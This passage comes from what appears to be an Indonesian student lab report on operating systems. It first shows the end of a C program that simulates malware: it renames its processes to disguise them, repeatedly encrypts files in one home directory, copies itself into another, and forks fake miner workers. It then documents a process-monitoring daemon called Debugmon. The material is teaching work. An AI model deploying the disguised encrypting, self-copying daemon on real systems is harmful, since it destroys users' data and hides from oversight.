    fclose(src);
    fclose(dest);
    closedir(dir);
}

char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}


void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]) {
    create_daemon();
    menyamarkan_process(argc, argv);
    child_1(argc, argv);
    child_2(argc, argv);
    child_3(argc, argv);
    while (1) {
        sleep(60);
    }
    return 0;
}
```

## Soal 4 - Debugmon 
> Soal ini tidak ada revisi

Author : Putu Yudi Nandanjaya Wiraguna (5027241080)

### Deskripsi

**Fitur Debugmon:**

1. **Mengetahui semua aktivitas user:**  
   Perintah: `./debugmon list <user>`  
   Menampilkan daftar semua proses yang berjalan pada user, termasuk PID, command, CPU usage, dan memory usage.

2. **Menjalankan sebagai daemon:**  
   Perintah: `./debugmon daemon <user>`  
   Memasang Debugmon untuk memantau aktivitas user secara otomatis dan mencatat ke dalam file log.

3. **Menghentikan pengawasan:**  
   Perintah: `./debugmon stop <user>`  
   Menghentikan pengawasan dan menghentikan semua proses yang berjalan.

4. **Menggagalkan semua proses user:**  
   Perintah: `./debugmon fail <user>`  
   Menggagalkan semua proses user yang sedang berjalan dan menulis status "FAILED" dalam log. User tidak bisa menjalankan proses lain.

5. **Mengizinkan user untuk kembali menjalankan proses:**  
   Perintah: `./debugmon revert <user>`  
   Mengembalikan ke mode normal, memungkinkan user untuk menjalankan proses lagi.

**Format log:**
Log dicatat dengan format:  
`[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)`  
Status "RUNNING" untuk poin b, c, dan e, dan status "FAILED" untuk poin d.

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>

#define PROC_PATH "/proc"
#define LOGFILE "debugmon.log"
```

Melakukan deklarasi terhadap library yang akan digunakan pada program dan mendefinisikan path ke `/proc` dan nama file log.

```
uid_t get_uid(const char *username) {
    struct passwd *pw = getpwnam(username);
    if (!pw) {
        fprintf(stderr, "User '%s' tidak ditemukan.\n", username);
        exit(EXIT_FAILURE);
    }
    return pw->pw_uid;
}
```

Fungsi ini mengambil UID dari username. Menggunakan `getpwnam()` yang mengakses `/etc/passwd`. Jika user tidak ada, tampilkan error dan keluar dari program.

```
int is_numeric(const char *str) {
    while (*str) {
        if (!isdigit(*str)) return 0;
        str++;
    }
    return 1;
}
```

Cek apakah suatu string berisi hanya angka (untuk memastikan kita hanya mengecek direktori `/proc/<pid>)`.

```
void write_log(const char *process_name, const char *status) {
    FILE *log = fopen(LOGFILE, "a");
    if (!log) return;

    time_t now = time(NULL);
    struct tm *local_time = localtime(&now);

    char time_str[64];
    strftime(time_str, sizeof(time_str), "[%d:%m:%Y]-[%H:%M:%S]", local_time);

    fprintf(log, "%s_%s_%s\n", time_str, process_name, status);
    fclose(log);
}
```
Fungsi ini menulis log ke file debugmon.log. Log format:
`[DD:MM:YYYY]-[HH:MM:SS]_nama_proses_STATUS`

```
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();

    if (chdir("/home/yudi0312/Sisop-2-2025-IT15/soal_4/") < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}
```

Fungsi ini mengubah program menjadi **daemon**, yaitu proses yang berjalan di latar belakang tanpa interaksi langsung dengan pengguna. Proses ini diawali dengan `fork()` untuk memisahkan diri dari terminal; parent-nya keluar, dan child-nya lanjut. Kemudian `setsid()` membuat session baru sehingga proses tidak lagi menjadi bagian dari terminal. Direktori kerja diubah dengan `chdir()`, lalu stdin, stdout, dan stderr ditutup dan diarahkan ke `/dev/null` agar proses tidak membaca/menulis ke terminal, membuatnya menjadi proses yang bersih dan tidak mengganggu pengguna.

```
void monitor_user(const char *username, int fail_mode) {
    uid_t target_uid = get_uid(username);

    while (1) {
        DIR *dir = opendir(PROC_PATH);
        if (!dir) {
            sleep(5);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (!is_numeric(entry->d_name)) continue;

            int pid = atoi(entry->d_name);
            char path[256], line[256], proc_name[256] = "-";
            FILE *fp;
            uid_t proc_uid;

            snprintf(path, sizeof(path), PROC_PATH"/%d/status", pid);
            fp = fopen(path, "r");
            if (!fp) continue;

            while (fgets(line, sizeof(line), fp)) {
                if (sscanf(line, "Uid: %d", &proc_uid) == 1) break;
            }
            fclose(fp);

            if (proc_uid != target_uid) continue;

            snprintf(path, sizeof(path), PROC_PATH"/%d/comm", pid);
            fp = fopen(path, "r");
            if (fp) {
                fgets(proc_name, sizeof(proc_name), fp);
                proc_name[strcspn(proc_name, "\n")] = 0;
                fclose(fp);
            }

            if (strcmp(proc_name, "debugmon") == 0) {
                write_log(proc_name, "RUNNING");
            } else if (fail_mode) {
                if (kill(pid, SIGKILL) == 0) {
                    write_log(proc_name, "FAILED");
                }
            }
        }
        closedir(dir);
        sleep(5);
    }
}
```

Berikut adalah kode fungsi `monitor_user` dan penjelasan dalam satu paragraf:

```c
// Memantau proses user dan mencatat log sesuai mode
void monitor_user(const char *username, int fail_mode) {
    uid_t target_uid = get_uid(username);

    while (1) {
        DIR *dir = opendir(PROC_PATH);
        if (!dir) {
            sleep(5);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (!is_numeric(entry->d_name)) continue;

            int pid = atoi(entry->d_name);
            char path[256], line[256], proc_name[256] = "-";
            FILE *fp;
            uid_t proc_uid;

            snprintf(path, sizeof(path), PROC_PATH"/%d/status", pid);
            fp = fopen(path, "r");
            if (!fp) continue;

            while (fgets(line, sizeof(line), fp)) {
                if (sscanf(line, "Uid: %d", &proc_uid) == 1) break;
            }
            fclose(fp);

            if (proc_uid != target_uid) continue;

            snprintf(path, sizeof(path), PROC_PATH"/%d/comm", pid);
            fp = fopen(path, "r");
            if (fp) {
                fgets(proc_name, sizeof(proc_name), fp);
                proc_name[strcspn(proc_name, "\n")] = 0;
                fclose(fp);
            }

            if (strcmp(proc_name, "debugmon") == 0) {
                write_log(proc_name, "RUNNING");
            } else if (fail_mode) {
                if (kill(pid, SIGKILL) == 0) {
                    write_log(proc_name, "FAILED");
                }
            }
        }
        closedir(dir);
        sleep(5);
    }
}
```

### Penjelasan:
Fungsi `monitor_user` digunakan untuk memantau semua proses yang berjalan milik user tertentu dengan membandingkan UID-nya, lalu mencatat aktivitas tersebut dalam log, atau menghentikannya jika berada dalam mode `fail`. Fungsi ini berjalan dalam loop tak hingga dan secara berkala (setiap 5 detik) membaca direktori `/proc` untuk menemukan direktori dengan nama numerik (yang merepresentasikan PID). Ia membuka file `/proc/[pid]/status` untuk mendapatkan UID proses, dan jika cocok dengan UID target user, akan mengecek nama proses di `/proc/[pid]/comm`. Jika nama proses adalah `debugmon`, maka status "RUNNING" dicatat dalam log; jika mode `fail_mode` aktif dan nama proses bukan `debugmon`, maka proses tersebut akan dihentikan (dikirim sinyal `SIGKILL`) dan dicatat sebagai "FAILED" dalam log.

```
void stop_user_daemon(const char *username) {
    DIR *dir = opendir(PROC_PATH);
    if (!dir) return;

    uid_t uid_target = get_uid(username);
    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (!is_numeric(entry->d_name)) continue;

        int pid = atoi(entry->d_name);
        char path[256], line[1024], exe_path[256];
        uid_t uid_proc;

        snprintf(path, sizeof(path), PROC_PATH"/%d/status", pid);
        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        while (fgets(line, sizeof(line), fp)) {
            if (sscanf(line, "Uid: %d", &uid_proc) == 1) break;
        }
        fclose(fp);
        if (uid_proc != uid_target) continue;

        snprintf(path, sizeof(path), PROC_PATH"/%d/exe", pid);
        ssize_t len = readlink(path, exe_path, sizeof(exe_path) - 1);
        if (len == -1) continue;
        exe_path[len] = '\0';

        if (!strstr(exe_path, "debugmon")) continue;

        snprintf(path, sizeof(path), PROC_PATH"/%d/cmdline", pid);
        fp = fopen(path, "r");
        if (!fp) continue;
        size_t read_bytes = fread(line, 1, sizeof(line) - 1, fp);
        fclose(fp);

        line[read_bytes] = '\0';

        char *args[10];
        int argc = 0;
        char *ptr = line;
        while (ptr < line + read_bytes && argc < 10) {
            args[argc++] = ptr;
            ptr += strlen(ptr) + 1;
        }

        if (argc >= 3 && strstr(args[0], "debugmon") && strcmp(args[2], username) == 0) {
            if (kill(pid, SIGTERM) == 0) {
                printf("The debugmon daemon process (PID %d) for user '%s' has been successfully stopped.\n", pid, username);
            }
        }
    }
    closedir(dir);
}
```

Fungsi `stop_user_daemon` bertugas untuk menghentikan proses daemon `debugmon` yang dijalankan oleh user tertentu dengan cara mencari semua proses milik user tersebut di direktori `/proc`, kemudian memverifikasi apakah proses tersebut benar-benar `debugmon` yang dijalankan dengan parameter sesuai username target. Fungsi ini membaca UID dari setiap proses dan mengecek executable-nya melalui symbolic link `/proc/[pid]/exe`, serta membaca argumen proses dari `/proc/[pid]/cmdline`. Jika ditemukan proses `debugmon` dengan argumen yang sesuai, maka proses tersebut dihentikan dengan sinyal `SIGTERM` dan mencetak pesan keberhasilan ke terminal.

```
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage:\n");
        printf("  %s list <user>    - Display all running processes of the user\n", argv[0]);
        printf("  %s daemon <user>  - Start debugmon as a daemon to monitor the user\n", argv[0]);
        printf("  %s stop <user>    - Stop the debugmon daemon monitoring the user\n", argv[0]);
        printf("  %s fail <user>    - Kill all user processes and block new ones\n", argv[0]);
        printf("  %s revert <user>  - Revert fail mode and allow user processes again\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (strcmp(argv[1], "list") == 0) {
        uid_t uid = get_uid(argv[2]);
        DIR *dir = opendir(PROC_PATH);
        if (!dir) {
            perror("Gagal membuka /proc");
            return EXIT_FAILURE;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (!is_numeric(entry->d_name)) continue;

            int pid = atoi(entry->d_name);
            char path[256], line[256], proc_name[256] = "-";
            FILE *fp;
            uid_t proc_uid;
            double mem_kb = 0;

            snprintf(path, sizeof(path), PROC_PATH"/%d/status", pid);
            fp = fopen(path, "r");
            if (!fp) continue;

            while (fgets(line, sizeof(line), fp)) {
                if (sscanf(line, "Uid: %d", &proc_uid) == 1) break;
            }
            fclose(fp);
            if (proc_uid != uid) continue;

            snprintf(path, sizeof(path), PROC_PATH"/%d/comm", pid);
            fp = fopen(path, "r");
            if (fp) {
                fgets(proc_name, sizeof(proc_name), fp);
                proc_name[strcspn(proc_name, "\n")] = 0;
                fclose(fp);
            }

            snprintf(path, sizeof(path), PROC_PATH"/%d/statm", pid);
            fp = fopen(path, "r");
            if (fp) {
                long pages;
                if (fscanf(fp, "%ld", &pages) == 1) {
                    long page_size_kb = sysconf(_SC_PAGE_SIZE) / 1024;
                    mem_kb = pages * page_size_kb;
                }
                fclose(fp);
            }

            printf("PID: %-6d CMD: %-20s CPU: %.2f%% MEM: %.2f KB\n", pid, proc_name, 0.0, mem_kb);
        }
        closedir(dir);

    } else if (strcmp(argv[1], "daemon") == 0) {
        daemonize();
        monitor_user(argv[2], 0);

    } else if (strcmp(argv[1], "fail") == 0) {
        daemonize();
        monitor_user(argv[2], 1);

    } else if (strcmp(argv[1], "stop") == 0 || strcmp(argv[1], "revert") == 0) {
        stop_user_daemon(argv[2]);

    } else {
        printf("Command not recognized.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```

Fungsi `main` memproses argumen untuk menentukan aksi program: menampilkan daftar proses `list`, menjalankan pemantauan sebagai `daemon`, menghentikan proses daemon `stop`/`revert`, atau memblokir semua proses pengguna `fail`. Bergantung pada perintah yang diberikan, `main` akan memanggil fungsi `daemonize`, `monitor_user`, atau `stop_user_daemon` untuk mengelola proses user yang ditargetkan.


screenshot : 

a. `./debugmon list <user>`

![Image](https://github.com/user-attachments/assets/4914450f-14cd-4147-ab9c-3e94ebffd4f5)

b. `./debugmon daemon <user>`

![Image](https://github.com/user-attachments/assets/ecfa68ae-122f-4bfd-bb65-fef8aed86d99)

c. `./debugmon stop <user>`

![image](https://github.com/user-attachments/assets/4edefd58-899c-4cfa-88a7-aae8bc6d260c)

d. `./debugmon fail <user>`

![Image](https://github.com/user-attachments/assets/08a3f2c5-08a1-4e2e-93bc-87509e99923c)

e. `./debugmon revert <user>`

![Image](https://github.com/user-attachments/assets/51138b13-3b82-40f1-8afd-93b55ca9183a)

f. Mencatat ke dalam file log

![Image](https://github.com/user-attachments/assets/8ab2d392-34d1-4eca-9928-b9ffc8cfd899)

Kendala : tidak ada 


